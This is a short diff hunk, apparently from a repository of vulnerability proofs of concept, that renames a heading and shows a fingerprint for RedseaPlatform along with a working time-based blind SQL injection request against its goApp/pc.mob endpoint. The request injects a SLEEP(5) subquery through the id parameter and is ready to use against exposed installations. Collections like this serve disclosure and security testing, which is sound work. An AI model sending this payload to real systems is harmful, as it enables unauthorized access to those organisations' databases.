@@ -8,7 +8,7 @@
 body="/RedseaPlatform/skins/images/favicon.ico"
 ```
 
-## poc
+## POC
 
 ```java
 GET /RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(5)))ndMq)%20AND%20%27NEoX%27=%27NEoX HTTP/1.1
